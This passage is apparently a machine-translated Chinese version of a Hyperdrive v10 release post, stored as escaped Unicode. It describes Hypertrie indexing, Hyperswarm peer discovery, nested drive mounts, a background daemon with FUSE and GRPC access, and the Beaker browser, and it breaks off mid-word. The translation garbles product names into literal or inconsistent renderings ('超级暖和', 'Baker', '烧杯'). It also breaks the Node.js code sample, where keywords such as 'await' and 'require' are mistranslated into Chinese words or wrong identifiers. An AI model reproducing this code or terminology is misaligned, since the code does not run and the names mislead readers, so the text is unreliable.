V10\u5229\u7528Hypertrie\u5b9e\u73b0\u66f4\u597d\u7684\u7d22\u5f15\uff0c\u5229\u7528Hypersarm\u5b9e\u73b0\u66f4\u597d\u7684\u8054\u7f51\u3002\n\u8d85\u7ea7\u6696\u548c\u662f\u4e00\u4e2a\u5361\u5fb7\u59c6\u5229\u4e9a\u652f\u6301\u7684\u5206\u5e03\u5f0f\u54c8\u5e0c\u8868\u5b9e\u73b0\uff0c\u662f\u4e13\u95e8\u4e3a\u5bb6\u5ead\u8bbe\u8ba1\u7684\u3002\u5b83\u4f7f\u7528\u5206\u5e03\u5f0f\u65b9\u6cd5\u6765\u4fdd\u6301\u8f6c\u53d1--\u5206\u5e03\u5f0f\u54c8\u5e0c\u8868\u4e2d\u7684\u5bf9\u7b49\u70b9\u53ef\u4ee5\u5e2e\u52a9\u5f15\u5bfc\u8fde\u63a5\u5230\u5176\u4ed6\u5bf9\u7b49\u70b9--\u5141\u8bb8\u6211\u4eec\u904d\u5386\u7edd\u5927\u591a\u6570\u5bb6\u5ead\u8def\u7531\u5668\u3002\n\u8d85\u7fa4\u8fd8\u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u542f\u53d1\u5f0f\u7b97\u6cd5\uff0c\u65e8\u5728\u7ed5\u8fc7\u79bb\u7ebf\u8282\u70b9\u5e76\u4fdd\u6301\u8def\u7531\u8868\u7684\u5065\u5eb7\u3002\u5f53\u4e0eHolepPunking\u76f8\u7ed3\u5408\u65f6\uff0c\u542f\u53d1\u5f0f\u65b9\u6cd5\u4f7f\u53d1\u73b0\u548c\u8fde\u63a5\u5230\u540c\u7ea7\u7684\u901f\u5ea6\u5927\u5927\u52a0\u5feb\u3002\nHyperDrive v9\u4f7f\u7528\u7684\u7d22\u5f15\u6570\u636e\u7ed3\u6784\u9002\u7528\u4e8e\u5c0f\u578b\u9a71\u52a8\u5668\uff0c\u4f46\u968f\u7740\u9a71\u52a8\u5668\u6216\u76ee\u5f55\u53d8\u5927\uff0c\u8be5\u7ed3\u6784\u5f88\u5feb\u5c31\u5d29\u6e83\u4e86\u3002\u5728V10\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u662fHypertrie\u3002\u5b83\u5177\u6709\u5f88\u597d\u7684\u4f38\u7f29\u6027--\u4f5c\u4e3a\u6f14\u793a\uff0c\u6211\u4eec\u5c06\u4e00\u4e2a\u5b8c\u6574\u7684\u7ef4\u57fa\u767e\u79d1\u955c\u50cf(\u6570\u5343\u4e07\u4e2a\u6587\u4ef6\uff0c\u5206\u6563\u5728\u51e0\u4e2a\u76ee\u5f55\u4e2d)\u653e\u5165\u4e00\u4e2a\u9a71\u52a8\u5668\u4e2d\uff0c\u8bfb\u53d6\u901f\u5ea6\u4fdd\u6301\u975e\u5e38\u5feb\u3002\n\u6211\u4eec\u5c06\u5728\u540e\u7eed\u7684\u5e16\u5b50\u4e2d\u5bf9Hypertrie\u8fdb\u884c\u6269\u5c55\uff0c\u4f46\u76ee\u524d\u4e3b\u8981\u7684\u7ed3\u8bba\u662f\uff0c\u60a8\u7684\u76ee\u5f55\u53ef\u4ee5\u50cf\u60a8(\u73b0\u5b9e\u5730)\u559c\u6b22\u7684\u90a3\u6837\u5927\uff0c\u5e76\u4e14\u6587\u4ef6\u67e5\u627e\u5c06\u4fdd\u6301\u5feb\u901f\uff01\n\u5728\u6b64\u7248\u672c\u4e2d\uff0c\u6211\u4eec\u5c06\u91cd\u70b9\u653e\u5728\u63d0\u9ad8\u53ef\u7528\u6027\u3001\u7b80\u5316\u9a71\u52a8\u5668\u7ba1\u7406\u548c\u51cf\u5c11\u5171\u4eab\u6469\u64e6\u7684\u529f\u80fd\u4e0a\u3002\u6211\u4eec\u60f3\u8981\u4ecb\u7ecd\u7684\u4e24\u4e2a\u6700\u5927\u7684\u4e1c\u897f\u662f\u6302\u8f7d\uff0c\u5b83\u5141\u8bb8\u60a8\u521b\u5efa\u5d4c\u5957\u7684\u8d85\u7ea7\u9a71\u52a8\u5668\uff0c\u4ee5\u53ca\u8d85\u7ea7\u9a71\u52a8\u5668\u5b88\u62a4\u7a0b\u5e8f\uff0c\u7528\u4f5c\u7ba1\u7406\u9a71\u52a8\u5668\u96c6\u5408\u7684\u4e00\u7ad9\u5f0f\u5546\u5e97\u3002\nHypercore\u4e3aHyperDrive\u63d0\u4f9b\u4e86\u8bb8\u591a\u5f88\u597d\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u7a00\u758f\u4e0b\u8f7d\uff0c\u800c\u4e14\u514d\u8d39--\u5927\u90e8\u5206\u5de5\u4f5c\u90fd\u662f\u5728\u8fd9\u4e00\u5c42\u5904\u7406\u7684\u3002\u7136\u800c\uff0cHypercore\u4ece\u6839\u672c\u4e0a\u8bf4\u662f\u4e00\u79cd\u5355\u7f16\u5199\u5668\u6570\u636e\u7ed3\u6784\u3002\u6838\u5fc3\u7684\u5199\u5165\u5668\u7ef4\u62a4\u4e00\u4e2a\u79c1\u94a5\uff0c\u8be5\u79c1\u94a5\u7528\u4e8e\u7b7e\u7f72\u6240\u6709\u9644\u52a0\u7684\u6570\u636e\uff0c\u4f7f\u8bfb\u8005\u53ef\u4ee5\u5728\u4ed6\u4eec\u4e4b\u95f4\u4ea4\u6362\u6570\u636e\uff0c\u800c\u4e0d\u5fc5\u62c5\u5fc3\u88ab\u7be1\u6539\u3002\u53ea\u5141\u8bb8\u4e00\u4e2a\u4eba(\u5728\u4e00\u53f0\u673a\u5668\u4e0a\uff01)\u3002\u4e0d\u8fc7\uff0c\u5bf9\u9a71\u52a8\u5668\u8fdb\u884c\u66f4\u6539\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u9650\u5236\u3002\u4e0d\u51fa\u6240\u6599\uff0c\u5bf9\u591a\u4e2a\u7f16\u5199\u5668\u7684\u652f\u6301\u957f\u671f\u4ee5\u6765\u4e00\u76f4\u662f\u6211\u4eec\u6700\u9700\u8981\u7684\u529f\u80fd\u4e4b\u4e00\u3002\n\u5728V10\u4e2d\uff0c\u6211\u4eec\u4e0d\u4f1a\u4e00\u76f4\u8d70\u5230\u901a\u7528\u7684\u591a\u7f16\u5199\u5668\u89e3\u51b3\u65b9\u6848\uff1b\u53ef\u4f38\u7f29\u5730\u89e3\u51b3\u591a\u7f16\u5199\u5668\uff0c\u800c\u4e0d\u4f1a\u62db\u81f4\u91cd\u5927\u7684\u6027\u80fd\u635f\u5931\u6216\u6df7\u6dc6UX\uff0c\u4ecd\u7136\u662f\u6211\u4eec\u7684\u7814\u7a76\u95ee\u9898\u3002\u8fd9\u5c31\u662f\u8bf4\uff0cV10\u5f15\u5165\u4e86\u6302\u8f7d\uff0c\u8fd9\u4e9b\u6302\u8f7d\u51e0\u4e4e\u94fe\u63a5\u5230\u5916\u89c2\u548c\u884c\u4e3a\u90fd\u4e0e\u666e\u901a\u76ee\u5f55\u76f8\u4f3c\u7684\u5176\u4ed6\u8d85\u9a71\u52a8\u5668\u3002\n\u6302\u8f7d\u4e3a\u66f4\u7ec6\u7c92\u5ea6\u7684\u5171\u4eab\u548c\u6709\u8da3\u7684\u591a\u7528\u6237\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u5f88\u591a\u673a\u4f1a\u3002\u5728\u5171\u4eab\u65b9\u9762\uff0c\u60a8\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2aprojects/\u76ee\u5f55\uff0c\u5176\u4e2d\u5305\u542b\u8bf8\u5982projects/my-module\u3001projects/my-WebSite\u4e4b\u7c7b\u7684\u6302\u8f7d--\u60a8\u6b63\u5728\u5904\u7406\u7684\u6bcf\u4ef6\u4e8b\u60c5\u90fd\u6709\u4e00\u4e2a\u9a71\u52a8\u5668\u3002\u6709\u4e86mount\uff0c\u60a8\u53ef\u4ee5\u81ea\u5df1\u5171\u4eabmy-WebSite\uff0c\u800c\u4e0d\u4f1a\u653e\u5f03\u5bf9project/\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u7684\u8bbf\u95ee\u3002\u6b64\u6a21\u5f0f\u5728\u5b88\u62a4\u8fdb\u7a0b\u4e2d\u7279\u522b\u65b9\u4fbf\uff0c\u6211\u4eec\u5c06\u5728\u4e0b\u9762\u8ba8\u8bba\u8be5\u5b88\u62a4\u8fdb\u7a0b\u3002\n\u5f53\u4f60\u8981\u5b89\u88c5\u7684\u9a71\u52a8\u5668\u4e0d\u662f\u4f60\u81ea\u5df1\u7684\u65f6\u5019\uff0c\u4e8b\u60c5\u4f1a\u53d8\u5f97\u66f4\u6709\u8da3\u3002\u6211\u4eec\u5728\u7ec4\u6a21\u5f0f\u65b9\u9762\u53d6\u5f97\u4e86\u5f88\u5927\u6210\u529f\uff0c\u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u7ec4\u6240\u6709\u8005\u9996\u5148\u521b\u5efa\u9876\u7ea7\u7ec4\u9a71\u52a8\u5668\uff0c\u7136\u540e\u5728\u7ec4\u4e2d\u88c5\u8f7d\u7528\u6237\u914d\u7f6e\u6587\u4ef6\uff1a\n/my-group//\u7531\u7ec4\u6240\u6709\u8005(\u4f8b\u5982\u7528\u6237A)\u62e5\u6709/user-a//\u7531\u7528\u6237A\u62e5\u6709/user-b//\u7531\u7528\u6237B\u62e5\u6709.\n\u4f7f\u7528\u8fd9\u79cd\u6a21\u5f0f\uff0c\u60a8\u53ef\u4ee5\u7f16\u5199\u7b80\u5355\u7684\u7fa4\u4ef6\uff0c\u5728\u7ec4\u9a71\u52a8\u5668\u4e0a\u4f7f\u7528\u9012\u5f52\u7684readdir\u6765\u805a\u5408\u7528\u6237\u95f4\u7684\u5185\u5bb9\u3002(#34\uff1bGroupware&#34\uff1b)\u3002\u4f8b\u5982\uff0c\u8981\u67e5\u627e\u7ec4\u4e2d\u7684\u6240\u6709\u535a\u5ba2\u5e16\u5b50\uff0c\u60a8\u53ef\u4ee5\u5728\u6bcf\u4e2a\u7528\u6237\u7684\u535a\u5ba2/\u76ee\u5f55\u4e2d\u641c\u7d22\u6240\u6709Markdown\u6587\u4ef6\u3002\n\u5982\u679c\u60a8\u76f4\u63a5\u4f7f\u7528HyperDrive\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528drive.mount(path\uff0ckey\uff0c[opts])\u65b9\u6cd5\u3002\u5b83\u7684\u5de5\u4f5c\u65b9\u5f0f\u4e0e\u60a8\u4eceargs\u4e2d\u671f\u671b\u7684\u4e00\u6837(\u6302\u8f7d\u5bc6\u94a5\u4f4d\u4e8epath)\uff0c\u5e76\u4e14\u9009\u9879\u53ef\u4ee5\u5305\u62ec\u9759\u6001\u9a71\u52a8\u5668\u7248\u672c\u3002\n\u901a\u8fc7CLI\u5728\u5b88\u62a4\u8fdb\u7a0b\u4e2d\u521b\u5efa\u88c5\u8f7d\u4e5f\u5f88\u5bb9\u6613\uff0c\u4e0b\u9762\u6211\u4eec\u5c06\u4ecb\u7ecd\u8fd9\u4e00\u70b9\u3002\nHyperDrive\u5728\u6784\u5efa\u65f6\u8003\u8651\u5230\u4e86\u6a21\u5757\u5316\u5b58\u50a8\u548c\u8054\u7f51--\u60a8\u53ef\u4ee5\u968f\u5fc3\u6240\u6b32\u5730\u5b58\u50a8\u9a71\u52a8\u5668\u5185\u5bb9\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u4efb\u4f55Node.js\u6d41\u590d\u5236\u5b83\u4eec\u3002\u8fd9\u79cd\u7075\u6d3b\u6027\u6709\u597d\u5904\uff0c\u4f46\u5b83\u4f7f\u5f00\u59cb\u5de5\u4f5c\u53d8\u5f97\u66f4\u52a0\u56f0\u96be\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a\u8de8\u5e73\u53f0\u7684\u540e\u53f0\u670d\u52a1(\u5b88\u62a4\u7a0b\u5e8f)\uff0c\u5b83\u4e3a\u60a8\u5904\u7406\u5b58\u50a8/\u7f51\u7edc\uff0c\u540c\u65f6\u4e3a\u60a8\u63d0\u4f9b\u8bbf\u95ee\u5b88\u62a4\u7a0b\u5e8f\u7ba1\u7406\u7684\u9a71\u52a8\u5668\u7684\u591a\u79cd\u65b9\u5f0f\u3002\n\u5b88\u62a4\u7a0b\u5e8f\u662f\u4e00\u9879\u957f\u671f\u8fd0\u884c\u7684\u670d\u52a1\uff0c\u56e0\u6b64\u5b83\u53ef\u4ee5\u4f7f\u60a8\u7684\u9a71\u52a8\u5668\u4fdd\u6301\u5728\u7ebf\u5e76\u53ef\u4f9b\u8bfb\u8005\u4f7f\u7528\u3002\u5b83\u5bf9\u5206\u5e03\u5f0f\u54c8\u5e0c\u8868\u7684\u5065\u5eb7\u4e5f\u5f88\u6709\u597d\u5904\uff1a\u56e0\u4e3a\u60a8\u7684\u8ba1\u7b97\u673a\u4e0a\u7684\u8282\u70b9\u662f\u7a33\u5b9a\u7684\uff0c\u6240\u4ee5\u5206\u5e03\u5f0f\u54c8\u5e0c\u8868\u7684\u8def\u7531\u8868\u4e2d\u5305\u542b\u7684\u79bb\u7ebf\u8282\u70b9\u8f83\u5c11\u3002\u8fd9\u8f6c\u5316\u4e3a\u66f4\u5feb\u7684\u5bc6\u94a5\u67e5\u627e\uff0c\u8fd9\u610f\u5473\u7740\u66f4\u5feb\u7684\u52a0\u8f7d\u65f6\u95f4\u3002\n\u6700\u91cd\u8981\u7684\u662f\uff0c\u8be5\u5b88\u62a4\u8fdb\u7a0b\u5145\u5f53\u5411\u5916\u90e8\u670d\u52a1\u516c\u5f00\u9a71\u52a8\u5668\u7684\u4e2d\u5fc3\u70b9--\u76ee\u524d\u6211\u4eec\u652f\u6301GRPC API\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684Node.js\u5ba2\u6237\u7aef\u5e93\u548cFUSE\u63a5\u53e3\u3002\nFUSE\u5141\u8bb8\u6211\u4eec\u4eceNode.js\u4ee3\u7801\u4e2d\u6a21\u62df\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u76ee\u5f55\u3002\u5b83\u53ef\u4ee5\u8ba9\u6211\u4eec\u5c06\u8d85\u7ea7\u9a71\u52a8\u5668\u53d8\u6210\u60a8\u8ba1\u7b97\u673a\u4e0a\u7684\u666e\u901a\u76ee\u5f55\uff01\u8fd9\u610f\u5473\u7740\u6bcf\u5f53\u5b88\u62a4\u8fdb\u7a0b\u8fd0\u884c\u65f6\uff0c\u60a8\u90fd\u53ef\u4ee5\u76f4\u63a5\u4eceOSX Finder\u4e2d\u8bbf\u95ee\u9a71\u52a8\u5668\uff0c\u6bd4\u5982\u8bf4\uff0c\u4f5c\u4e3a~/Hyperdrive\u4e2d\u7684\u865a\u62df\u76ee\u5f55\u3002\n\u6709\u4e86FUSE\uff0c\u5176\u4ed6\u7a0b\u5e8f\u53ef\u4ee5\u7acb\u5373\u8bbf\u95ee\u9a71\u52a8\u5668\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528VLC\u89c2\u770b\u7535\u5f71\uff0c\u4f7f\u7528\u60a8\u6700\u559c\u6b22\u7684\u9605\u8bfb\u5668\u7a0b\u5e8f\u52a0\u8f7dPDF\uff0c\u5e76\u4f7f\u7528\u8bf8\u5982find\u548cls\u4e4b\u7c7b\u7684Unix\u5b9e\u7528\u7a0b\u5e8f\u6765\u6d4f\u89c8\u9a71\u52a8\u5668\u3002\u6211\u4eec\u5c06\u5728\u4e0b\u9762\u7684\u5165\u95e8\u90e8\u5206\u8fdb\u884c\u66f4\u6df1\u5165\u7684\u4ecb\u7ecd\u3002\nHyperDrive CLI\u5de5\u5177\u5305\u542b\u4e00\u4e9b\u547d\u4ee4\uff0c\u7528\u4e8e\u4e0eFUSE\u4ea4\u4e92\u4ee5\u53ca\u663e\u793a\u6709\u5173\u9a71\u52a8\u5668\u7684\u4fe1\u606f\u3002\u5b83\u8fd8\u4e3a\u90a3\u4e9b\u4e0d\u60f3\u6446\u5f04~/Hyperdrive\u7684\u7528\u6237\u63d0\u4f9b\u5bfc\u5165\u548c\u5bfc\u51fa\u547d\u4ee4\u3002\n\u867d\u7136\u6dfb\u52a0~/Hyperdrive\u76ee\u5f55\u662f\u4e3a\u4e86\u7b80\u5316\u6700\u7ec8\u7528\u6237UX\uff0c\u4f46GRPC API\u662f\u4e3a\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u7684--\u60a8\u73b0\u5728\u53ef\u4ee5\u7528\u4efb\u4f55\u8bed\u8a00\u4f7f\u7528Hyperdrive\u7f16\u7a0b\uff0c\u800c\u4e0d\u9700\u8981\u5904\u7406\u68d8\u624b\u7684\u8054\u7f51API\u3002\u5982\u679c\u60a8\u6b63\u5728\u4f7f\u7528Node.js\uff0c\u5ba2\u6237\u7aef\u5e93\u5c06\u4e3a\u60a8\u63d0\u4f9b\u4e00\u4e2a\u611f\u89c9\u4e0e\u666e\u901a\u9a71\u52a8\u5668\u5b8c\u5168\u76f8\u540c\u7684RemoteHyperdrive\u754c\u9762\u3002\u8981\u5f00\u59cb\uff0c\u8bf7\u8df3\u5230\u8fd9\u91cc\u3002\n\u6211\u4eec\u5e0c\u671b\u5b88\u62a4\u7a0b\u5e8f\u80fd\u4e3a\u5e0c\u671b\u5171\u4eab\u6570\u636e\u7684\u7ec8\u7aef\u7528\u6237\u548c\u60f3\u8981\u4f7f\u7528HyperDrive\u6784\u5efa\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u7684\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u4e00\u4e2a\u65e0\u6469\u64e6\u7684\u5165\u53e3\u70b9\u3002\u5982\u679c\u60a8\u5bf9\u7528\u6237\u4f53\u9a8c\u6709\u4ec0\u4e48\u60f3\u6cd5\u6216\u53cd\u9988\uff0c\u8bf7\u4e0d\u8981\u72b9\u8c6b\u52a0\u5165\u6211\u4eec\u7684\u804a\u5929\uff01\n\u8df3\u5165Hyperdrive\u5806\u6808\u7684\u6700\u4f73\u65b9\u5f0f\u662f\u5b89\u88c5\u5b88\u62a4\u7a0b\u5e8f\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7NPM\u5b9e\u73b0\uff1a\n\u4e00\u65e6\u5b89\u88c5\u4e86\u540e\u53f0\u8fdb\u7a0b\uff0c\u60a8\u5c31\u53ef\u4ee5\u8bbf\u95eeHyperDrive CLI\u547d\u4ee4\u3002\u4ece\u8fd9\u91cc\u5f00\u59cb\uff0c\u60a8\u6709\u51e0\u4e2a\u9009\u62e9\u3002\u6709\u5173\u66f4\u8be6\u7ec6\u7684\u6307\u5357\uff0c\u6700\u597d\u53c2\u8003\u5b88\u62a4\u7a0b\u5e8f\u7684\u81ea\u8ff0\u6587\u4ef6\uff0c\u4f46\u6211\u4eec\u5c06\u5728\u6b64\u91cd\u70b9\u4ecb\u7ecd\u5173\u952e\u6b65\u9aa4\u3002\n\u6ce8\u610f\uff1aFUSE\u76ee\u524d\u4ec5\u5728Linux\u548cOSX\u4e0a\u53ef\u7528\u3002CLI\u7684\u5bfc\u5165\u548c\u5bfc\u51fa\u547d\u4ee4\u53ef\u7528\u4e8e\u5728Windows\u4e0a\u5c06\u6570\u636e\u79fb\u5165/\u79fb\u51fa\u9a71\u52a8\u5668\u3002\n\u5b89\u88c5\u4e4b\u540e\uff0c\u60a8\u9700\u8981\u7acb\u5373\u6267\u884c\u4e00\u6b21\u6027\u8bbe\u7f6e\u6b65\u9aa4\uff0c\u8fd9\u5c06\u8bf7\u6c42sudo\u8bbf\u95ee--\u4e0d\u7528\u62c5\u5fc3\uff0c\u5b88\u62a4\u8fdb\u7a0b\u672c\u8eab\u5e76\u4e0d\u662f\u4ee5root\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u7684\u3002\u8fd9\u662f\u914d\u7f6e\u6346\u7ed1\u7684\u7194\u4e1d\u5185\u6838\u6a21\u5757\u6240\u5fc5\u9700\u7684\uff1a\n\u4e4b\u540e\uff0c\u6b63\u5e38\u542f\u52a8\u5b88\u62a4\u8fdb\u7a0b\uff0c\u60a8\u4f1a\u6ce8\u610f\u5230~/Hyperdrive\u76ee\u5f55\u5b58\u5728\uff0c\u5e76\u4e14\u5305\u542b\u4e00\u4e2a\u540d\u4e3aNetwork\u7684\u5b50\u76ee\u5f55\u3002\u5982\u679c\u4f60\u770b\u5230\u201c\u7f51\u7edc\u201d\uff0c\u4f60\u5c31\u53ef\u4ee5\u5f00\u59cb\u4e86\u3002\n\u6b63\u5982\u5b88\u62a4\u7a0b\u5e8f\u81ea\u8ff0\u6587\u4ef6\u4e2d\u7684\u6f14\u7ec3\u4e2d\u6240\u8ff0\uff0c~/Hyperdrive\u662f\u60a8\u7684&#34\uff1b\u6839\u9a71\u52a8\u5668\uff0c\u60a8\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3aHome\u76ee\u5f55\u7684\u66ff\u4ee3\u54c1\u3002\u60a8\u53ef\u4ee5\u6839\u636e\u9700\u8981\u5728\u5176\u4e2d\u521b\u5efa\u5b50\u76ee\u5f55\uff0c\u5982\u6587\u6863\u3001\u89c6\u9891\u6216\u9879\u76ee\u3002\n~/Hyperdrive/Network\u662f\u4e00\u4e2a\u795e\u5947\u7684\u76ee\u5f55\uff0c\u56e0\u4e3a\u5b83\u5b9e\u9645\u4e0a\u5e76\u4e0d\u5b58\u5728\u4e8e\u60a8\u7684\u6839\u9a71\u52a8\u5668\u4e2d\u3002\u5b83\u7684\u5b58\u5728\u662f\u4e3a\u4e86\u8ba9\u60a8\u53ef\u4ee5\u8f7b\u677e\u5730\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a\n\u6709\u5173\u7f51\u7edc\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u4ee5\u53ca\u60a8\u53ef\u4ee5\u7528\u6765\u586b\u5145\u548c\u6d4f\u89c8\u6839\u9a71\u52a8\u5668\u7684\u6240\u6709CLI\u547d\u4ee4\u7684\u8bf4\u660e\uff0c\u53ef\u4ee5\u5728\u81ea\u8ff0\u6587\u4ef6\u4e2d\u627e\u5230\u3002\n\u5982\u679c\u60a8\u6b63\u5728\u8fd0\u884c\u5b88\u62a4\u7a0b\u5e8f\u5b9e\u4f8b\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528hydrive-daemon-client\u6a21\u5757\u521b\u5efaRemoteHyperdrive\u5bf9\u8c61\u3002\u5728\u5e55\u540e\uff0c\u5b83\u4eec\u5c06\u901a\u8fc7GRPC\u5411\u5b88\u62a4\u7a0b\u5e8f\u7ba1\u7406\u7684\u9a71\u52a8\u5668\u53d1\u9001\u547d\u4ee4\u3002\nRemoteHyperdrive API\u955c\u50cfHyperdrive\u3002\u4ee5\u4e0b\u4ee3\u7801\u7247\u65ad\u5c06\u521b\u5efa\u4e00\u4e2a\u5ba2\u6237\u7aef\u5b9e\u4f8b\uff0c\u4f7f\u7528\u8be5\u5ba2\u6237\u7aef\u521b\u5efa\u4e00\u4e2a\u65b0\u9a71\u52a8\u5668\uff0c\u7136\u540e\u5c06\u6587\u4ef6\u5199\u5165\u8be5\u9a71\u52a8\u5668\uff1a\nconst{HyperdriveClient}=Required(&#39\uff1bHyperdrive-daemon-client&#39\uff1b)//\u81ea\u52a8\u8fde\u63a5\u5230\u5b88\u62a4\u8fdb\u7a0bconst client=new()\u7b49\u5f85\u5ba2\u6237\u7aef\u3002Ready()//\u521b\u5efa\u65b0\u9a71\u52a8\u5668\u5e76\u5199\u5165\u6587\u4ef6const drive=await client.drive\u3002get()\u7b49\u5f85\u9a7e\u9a76\u3002writeFile(&#39\uff1bfoo.txt&#39\uff1b\uff0c&#39\uff1bbar&#39\uff1b)\u3002\n\u5b88\u62a4\u8fdb\u7a0b\u7684\u81ea\u8ff0\u6587\u4ef6\u63d0\u4f9b\u4e86\u66f4\u591a\u793a\u4f8b\u3002\u5230\u4eca\u5929\u4e3a\u6b62\uff0c\u6211\u4eec\u53ea\u6709\u4e00\u4e2aNode.js\u5ba2\u6237\u7aef\uff0c\u4f46\u662f\u5b88\u62a4\u8fdb\u7a0b\u7684GRPC\u67b6\u6784\u662f\u53ef\u7528\u7684\uff0c\u6211\u4eec\u6b22\u8fce\u4efb\u4f55\u7528\u5176\u4ed6\u8bed\u8a00\u521b\u5efa\u5ba2\u6237\u7aef\u7684\u52aa\u529b\u3002\n\u70e7\u676f\u6d4f\u89c8\u5668\u5728\u5185\u90e8\u5927\u91cf\u4f7f\u7528HyperDrive\u3002\u4eca\u5929\u4e5f\u5c06\u53d1\u5e03\u7684Baker 1.0 Beta\u5b9e\u9645\u4e0a\u4f1a\u5728\u540e\u53f0\u4e3a\u60a8\u5b89\u88c5\u548c\u7ba1\u7406\u5b88\u62a4\u7a0b\u5e8f\uff01Beaker\u81ea\u5e26\u521b\u4f5c\u5de5\u5177\uff0c\u7528\u4e8e\u521b\u5efaP2P\u7f51\u7ad9\u5e76\u4e0e\u4ed6\u4eba\u5206\u4eab\u3002\nBeaker\u5f00\u53d1\u8005\u95e8\u6237\u5305\u542b\u8be6\u5c3d\u7684\u6587\u6863\u548c\u6559\u7a0b(\u63d0\u793a\uff1a\u5728Beaker\u4e2d\u6253\u5f00\u8be5\u7f51\u7ad9\uff0c\u4f7f\u6559\u7a0b\u5177\u6709\u4ea4\u4e92\u6027\uff01)\uff0c\u56e0\u6b64\u60a8\u5c06\u7acb\u5373\u4e0a\u624b\uff0c\u6784\u5efa\u5305\u542b\u529f\u80fd\u9f50\u5168\u7684Web\u5e94\u7528\u7a0b\u5e8f\u7684\u8d85\u786c\u76d8(\u60f3\u60f3\u4e2a\u4eba\u7ef4\u57fa\u3001\u76f8\u518c\u3001\u535a\u5ba2\u805a\u5408\u5668\u7b49\u7b49)\u3002\n\u60a8\u53ef\u80fd\u5e0c\u671b\u5728\u5927\u591a\u6570\u65f6\u95f4\u4f7f\u7528\u5b88\u62a4\u8fdb\u7a0b/\u5ba2\u6237\u7aef\uff0c\u4f46\u5982\u679c\u60a8\u4e0d\u60f3\u4f7f\u7528-\u53ef\u80fd\u662f\u5728\u4e00\u6b21\u6027\u811a\u672c\u6216\u67d0\u79cd\u5d4c\u5165\u5f0f\u573a\u666f\u4e2d-\u60a8\u53ef\u4ee5\u5c06HyperDrive\u7528\u4f5c\u7a0b\u5e8f\u4e2d\u7684\u4e00\u4e2a\u6a21\u5757\u3002\u81ea\u8ff0\u6587\u4ef6\u5411\u60a8\u5c55\u793a\u4e86\u5982\u4f55\u64cd\u4f5c\uff0c\u60a8\u4e5f\u53ef\u4ee5\u5728\u81ea\u8ff0\u6587\u4ef6\u4e2d\u627e\u5230\u5b8c\u6574\u7684API\u6587\u6863\u3002\n\u8fd9\u91cc\u662f\u4e00\u4e2a\u8981\u70b9\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u7aef\u5230\u7aef\u7684\u5c0f\u793a\u4f8b\uff0c\u5c55\u793a\u4e86\u5982\u4f55\u4f7f\u7528\u8d85\u7ea7\u6696\u76d8\u6765\u53d1\u73b0\u548c\u540c\u6b65\u6765\u81ea\u53e6\u4e00\u4e2a\u5bf9\u7b49\u70b9\u7684\u8d85\u7ea7\u786c\u76d8\u3002\n\u5728\u672a\u6765\uff0c\u6211\u4eec\u8ba1\u5212\u5236\u4f5c\u4e00\u4e9b\u5173\u4e8e\u7f16\u7a0b\u4f7f\u7528Hyperdrive\u7684\u8be6\u7ec6\u6559\u7a0b\u3002\u8bf7\u8bb0\u4f4f\uff0c\u5982\u679c\u60a8\u6b63\u5728\u5bfb\u627e\u6700\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u8bf7\u67e5\u770b\u5b88\u62a4\u8fdb\u7a0b\u548c/\u6216\u70e7\u676f\uff01\n\u5982\u4f60\u6240\u89c1\uff0c\u6700\u8fd1\u53d1\u751f\u4e86\u5f88\u591a\u4e8b\u60c5\uff01\u4f46\u4ecd\u6709\u66f4\u591a\u5de5\u4f5c\u8981\u505a\u3002\u968f\u7740\u8fd9\u4e9b\u529f\u80fd\u7684\u53d1\u5e03\uff0c\u4e0b\u9762\u662f\u6211\u4eec\u4e0b\u4e00\u6b65\u8ba1\u5212\u7684\u8349\u56fe\u3002\n\u76ee\u524d\u5b9e\u65bd\u7684Hypertrie&#39\uff1bs\u5bfc\u81f4\u4e86\u91cd\u5927\u6536\u76ca\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c\u5b83\u7f3a\u5c11\u4e00\u4e9b\u60a8\u53ef\u80fd\u671f\u671b\u4ece\u6587\u4ef6\u7cfb\u7edf\u83b7\u5f97\u7684\u529f\u80fd\uff0c\u6700\u91cd\u8981\u7684\u662f\u539f\u5b50\u91cd\u547d\u540d\u3002\u6b64\u5916\uff0c\u7531\u4e8eTrie\u8fed\u4ee3\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u7b26\u53f7\u94fe\u63a5\u548c\u6302\u8f7d\u7684\u6548\u7387\u90fd\u7565\u4f4e\u4e8e\u6240\u9700\u7684\u6548\u7387\u3002\n\u6211\u4eec\u5df2\u7ecf\u5750\u5728\u4e00\u4e2a\u65b0\u7684\u3001\u4e25\u91cd\u6a21\u7cca\u7684Trie\u5b9e\u73b0\u4e0a\u6709\u4e00\u6bb5\u65f6\u95f4\u4e86\uff0c\u4f46\u6211\u4eec\u8fd8\u6ca1\u6709\u96c6\u6210\u5b83\u7684\u5468\u671f\u3002\u5b83\u901a\u8fc7\u7edf\u4e00\u7684\u8fed\u4ee3\u5668\u62bd\u8c61(\u6211\u4eec\u79f0\u4e4b\u4e3aTrie\u63a7\u5236\u5668)\u652f\u6301\u7b26\u53f7\u94fe\u63a5(\u76f4\u63a5\uff0c\u800c\u4e0d\u662f\u5728\u8d85\u7ea7\u9a71\u52a8\u5c4